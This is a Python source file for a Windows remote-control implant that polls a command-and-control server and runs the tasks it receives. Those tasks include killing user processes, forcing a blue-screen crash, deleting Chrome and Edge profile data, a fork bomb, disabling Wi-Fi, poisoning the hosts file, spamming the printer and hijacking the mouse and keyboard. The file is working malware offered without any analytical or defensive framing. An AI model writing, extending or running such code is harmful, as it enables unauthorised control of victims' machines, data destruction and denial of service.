import os, sys, socket, uuid, time, requests, threading, subprocess, random, string, tkinter as tk, shutil
try:
    import pyautogui, winsound, webbrowser, ctypes, psutil
except ImportError: pass

C2_URL = "http://127.0.0.1:5003"; HEARTBEAT_INTERVAL = 5
NOISE_ACTIVE, RANDOM_CLICKING_ACTIVE, RANDOM_TYPING_ACTIVE, CAPS_LOCK_SPAM_ACTIVE, OVERLAY_ACTIVE, USB_SPAM_ACTIVE, FOCUS_STEAL_ACTIVE, CURSOR_CHANGE_ACTIVE = False, False, False, False, False, False, False, False
OVERLAY_WINDOW, GUI_ROOT = None, None

def show_popup(title="Message", message="Hello!", icon_style="info", button_style="ok"):
    ICON_MAP = {"none": 0x00, "error": 0x10, "question": 0x20, "warning": 0x30, "info": 0x40}
    BUTTON_MAP = {"ok": 0x00, "ok_cancel": 0x01, "abort_retry_ignore": 0x02, "yes_no_cancel": 0x03, "yes_no": 0x04, "retry_cancel": 0x05}
    style = ICON_MAP.get(icon_style.lower(), 0x40) | BUTTON_MAP.get(button_style.lower(), 0x00)
    threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, message, title, style), daemon=True).start()
def _noise_loop():
    while NOISE_ACTIVE: winsound.Beep(random.randint(200, 2000), 200); time.sleep(0.1)
def toggle_noise():
    global NOISE_ACTIVE; NOISE_ACTIVE = not NOISE_ACTIVE
    if NOISE_ACTIVE: threading.Thread(target=_noise_loop, daemon=True).start()
def _usb_spam_loop():
    while USB_SPAM_ACTIVE:
        winsound.PlaySound("SystemHand", winsound.SND_ALIAS); time.sleep(random.uniform(0.5, 2.0))
        winsound.PlaySound("SystemAsterisk", winsound.SND_ALIAS); time.sleep(random.uniform(0.5, 2.0))
def toggle_usb_spam():
    global USB_SPAM_ACTIVE; USB_SPAM_ACTIVE = not USB_SPAM_ACTIVE
    if USB_SPAM_ACTIVE: threading.Thread(target=_usb_spam_loop, daemon=True).start()
def _caps_lock_loop():
    while CAPS_LOCK_SPAM_ACTIVE:
        if ctypes.windll.user32.GetKeyState(0x14) == 0:
            ctypes.windll.user32.keybd_event(0x14, 0x45, 1, 0); ctypes.windll.user32.keybd_event(0x14, 0x45, 3, 0)
        time.sleep(1)
def toggle_caps_lock_spam():
    global CAPS_LOCK_SPAM_ACTIVE; CAPS_LOCK_SPAM_ACTIVE = not CAPS_LOCK_SPAM_ACTIVE
    if CAPS_LOCK_SPAM_ACTIVE: threading.Thread(target=_caps_lock_loop, daemon=True).start()
def _create_overlay(color='black', alpha=0.5):
    global OVERLAY_WINDOW
    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy()
    OVERLAY_WINDOW = tk.Toplevel(GUI_ROOT)
    OVERLAY_WINDOW.attributes('-fullscreen', True); OVERLAY_WINDOW.attributes('-alpha', alpha)
    OVERLAY_WINDOW.attributes("-topmost", True); OVERLAY_WINDOW.configure(bg=color)
    OVERLAY_WINDOW.overrideredirect(True)
def _hide_overlay():
    global OVERLAY_WINDOW
    if OVERLAY_WINDOW: OVERLAY_WINDOW.destroy(); OVERLAY_WINDOW = None
def toggle_overlay(color='black', alpha=0.5):
    global OVERLAY_ACTIVE; OVERLAY_ACTIVE = not OVERLAY_ACTIVE
    if OVERLAY_ACTIVE: GUI_ROOT.after(0, lambda: _create_overlay(color=color, alpha=alpha))
    else: GUI_ROOT.after(0, _hide_overlay)
def open_website(url="https://google.com"): webbrowser.open(url)
def open_cd_tray():
    try:
        ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, None)
        time.sleep(3); ctypes.windll.winmm.mciSendStringW("set cdaudio door closed", None, 0, None)
    except: pass
def _random_clicking_loop():
    w, h = pyautogui.size()
    while RANDOM_CLICKING_ACTIVE: pyautogui.click(random.randint(0, w), random.randint(0, h)); time.sleep(random.uniform(0.5, 2.0))
def toggle_random_clicking():
    global RANDOM_CLICKING_ACTIVE; RANDOM_CLICKING_ACTIVE = not RANDOM_CLICKING_ACTIVE
    if RANDOM_CLICKING_ACTIVE: threading.Thread(target=_random_clicking_loop, daemon=True).start()
def _random_typing_loop():
    while RANDOM_TYPING_ACTIVE:
        pyautogui.write(random.choice(string.ascii_letters + string.digits), interval=random.uniform(0.1, 0.3))
        time.sleep(random.uniform(0.5, 1.5))
def toggle_random_typing():
    global RANDOM_TYPING_ACTIVE; RANDOM_TYPING_ACTIVE = not RANDOM_TYPING_ACTIVE
    if RANDOM_TYPING_ACTIVE: threading.Thread(target=_random_typing_loop, daemon=True).start()
def fake_shutdown(message="Windows is updating..."):
    def _sequence():
        subprocess.run(f'shutdown /s /t 60 /c "{message}"', shell=True, capture_output=True)
        time.sleep(30); subprocess.run('shutdown /a', shell=True, capture_output=True)
        show_popup("Update Failed", "The update could not be installed.", "error")
    threading.Thread(target=_sequence, daemon=True).start()
def toggle_desktop_icons():
    handle = ctypes.windll.user32.FindWindowW("Progman", None)
    handle = ctypes.windll.user32.FindWindowExW(handle, 0, "SHELLDLL_DefView", None)
    handle = ctypes.windll.user32.FindWindowExW(handle, 0, "FolderView", None)
    if ctypes.windll.user32.IsWindowVisible(handle): ctypes.windll.user32.ShowWindow(handle, 0)
    else: ctypes.windll.user32.ShowWindow(handle, 5)
def kill_tasks():
    critical_procs = ['csrss.exe', 'wininit.exe', 'winlogon.exe', 'lsass.exe', 'services.exe', 'smss.exe', 'explorer.exe']
    current_user = os.getlogin()
    for proc in psutil.process_iter(['pid', 'name', 'username']):
        try:
            if proc.info['username'] and current_user in proc.info['username'] and proc.info['name'].lower() not in critical_procs:
                psutil.Process(proc.info['pid']).terminate()
        except (psutil.NoSuchProcess, psutil.AccessDenied): continue
def bsod():
    nullptr = ctypes.pointer(ctypes.c_int()); ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
    ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, nullptr, nullptr, 6, ctypes.byref(ctypes.c_uint()))
def browser_eraser():
    for path in [os.path.join(os.environ["LOCALAPPDATA"], b) for b in [os.path.join("Google", "Chrome", "User Data"), os.path.join("Microsoft", "Edge", "User Data")]]:
        if os.path.exists(path): shutil.rmtree(path, ignore_errors=True)
def fork_bomb():
    while True: subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NO_WINDOW)

# --- NEW SYSTEM CONTROL FEATURES ---
def toggle_wifi(state="on"):
    """NEW: Enables or disables the Wi-Fi adapter."""
    action = "enable" if state == "on" else "disable"
    subprocess.run(f'powershell -Command "Get-NetAdapter -Name Wi-Fi* | {action}-NetAdapter"', shell=True, capture_output=True)
def set_screen_orientation(orientation="default"):
    """NEW: Rotates the screen."""
    orient_map = {"default": 0, "90": 1, "180": 2, "270": 3}
    value = orient_map.get(orientation, 0)
    device = ctypes.WinDLL('user32.dll').EnumDisplayDevicesW(None, 0, ctypes.byref(ctypes.create_unicode_buffer(128)), 0)
    settings = ctypes.WinDLL('user32.dll').EnumDisplaySettingsW(device.DeviceName, -1, ctypes.byref(ctypes.create_unicode_buffer(128)))
    settings.dmDisplayOrientation = value
    ctypes.WinDLL('user32.dll').ChangeDisplaySettingsW(ctypes.byref(settings), 0)
def printer_spam(text_to_print="You've been hacked"):
    """NEW: Spams text to the default printer."""
    temp_file = os.path.join(os.environ["TEMP"], "print_job.txt")
    with open(temp_file, "w") as f: f.write(text_to_print)
    for _ in range(10): # Spam 10 copies
        os.startfile(temp_file, "print")
        time.sleep(0.5)

def dns_poison(target_url, redirect_ip):
    """NEW: Adds an entry to the hosts file."""
    hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
    try:
        with open(hosts_path, "a") as f:
            f.write(f"\n{redirect_ip}\t{target_url}\n")
    except Exception as e:
        print(f"Failed to poison DNS (likely needs admin): {e}")

def process_tasks(tasks):
    if not tasks: return
    for task in tasks:
        command, args = task.get("command"), task.get("args", {})
        ACTION_MAP = {
            "show_popup": show_popup, "toggle_noise": toggle_noise, "toggle_caps_lock_spam": toggle_caps_lock_spam,
            "toggle_overlay": toggle_overlay, "hide_overlay": lambda: GUI_ROOT.after(0, _hide_overlay),
            "open_website": open_website, "toggle_random_clicking": toggle_random_clicking,
            "toggle_random_typing": toggle_random_typing, "toggle_usb_spam": toggle_usb_spam, 
            "fake_shutdown": fake_shutdown, "kill_tasks": kill_tasks, "bsod": bsod, "browser_eraser": browser_eraser, 
            "fork_bomb": fork_bomb, "toggle_wifi": toggle_wifi, "set_screen_orientation": set_screen_orientation, 
            "printer_spam": printer_spam, "dns_poison": dns_poison,
        }
        if command in ACTION_MAP:
            try: ACTION_MAP[command](**args)
            except Exception as e: print(f"[!] Error executing '{command}': {e}")

def c2_communication_loop():
    session_id, hostname = str(uuid.uuid4()), socket.gethostname()
    try: requests.post(f"{C2_URL}/api/register", json={"session_id": session_id, "hostname": hostname}, timeout=10)
    except: pass
    while True:
        try:
            response = requests.post(f"{C2_URL}/api/heartbeat", json={"session_id": session_id}, timeout=10)
            if response.status_code == 200 and "tasks" in (data := response.json()):
                process_tasks(data["tasks"])
        except: pass
        time.sleep(HEARTBEAT_INTERVAL)

if __name__ == "__main__":
    c2_thread = threading.Thread(target=c2_communication_loop, daemon=True)
    c2_thread.start()
    GUI_ROOT = tk.Tk()
    GUI_ROOT.withdraw()
    GUI_ROOT.mainloop()